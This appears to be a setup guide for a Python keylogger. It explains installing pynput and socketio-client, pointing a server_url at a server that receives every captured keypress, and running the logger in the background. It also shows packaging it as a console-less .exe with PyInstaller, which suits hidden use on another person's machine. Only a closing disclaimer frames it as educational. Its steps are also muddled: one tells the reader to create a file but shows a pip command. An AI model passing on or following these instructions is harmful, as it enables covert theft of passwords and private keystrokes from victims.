
**Note:** Before proceeding, make sure you have Python installed on your computer.

**Step 1: Install Required Packages**

1. Open a command prompt or terminal window.

2. Navigate to the directory where you have saved the Python script.

3. Create a text file named `requirements.txt` in the same directory if it doesn't exist. You can do this by running the following command:

   ```
   pip install -r requirements.txt
   ```

4. Edit the `requirements.txt` file and add the names of the Python packages you want to install, one per line. For example:

   ```
   pynput
   socketio-client
   ```

   Save and close the file.

5. Run the Python script to install the required packages:

   ```
   python script_name.py
   ```

   Replace `script_name.py` with the actual name of your Python script.

   - The script will read the package names from `requirements.txt` and attempt to install them using `pip`.

**Step 2: Specify Server URL**

In the Python script (`server.py`), find the following line:

```python
server_url = "http://127.0.0.1:5000"  # Replace with your actual server URL
```

Replace `"http://127.0.0.1:5000"` with the actual URL of the server where you want to send keypress data. Make sure the server is set up to receive this data.

**Step 3: Run the Keylogger**

1. Save your changes to the Python script.

2. Open a command prompt or terminal window.

3. Navigate to the directory where you have saved the Python script.

4. Run the Python script to start the keylogger:

   ```
   python script_name.py
   ```

   Replace `script_name.py` with the actual name of your Python script.

   - The keylogger will start monitoring your keyboard input.

**Step 4: Monitoring and Sending Keystrokes**

The keylogger will run in the background and start capturing your keystrokes.

- Each time you press a key, the keylogger will send the pressed key's information to the server URL specified in the script.

**Step 5: Stopping the Keylogger**

To stop the keylogger, you can press `Ctrl + C` in the terminal where it is running. This will terminate the script and stop the keylogging process.

**Important Note:**

**Step 6: Make it Exe**

Use `Pyinstaller` to create a .exe file this is the sample command `pyinstaller --onefile --noconsole script_name.py` and go to dist and get the exe file

  ```
   pyinstaller --onefile --noconsole script_name.py
   ```

**Important Note:**

- This script is provided for educational purposes only. Using keyloggers without permission is unethical and potentially illegal. Make sure you have proper authorization before using such tools.


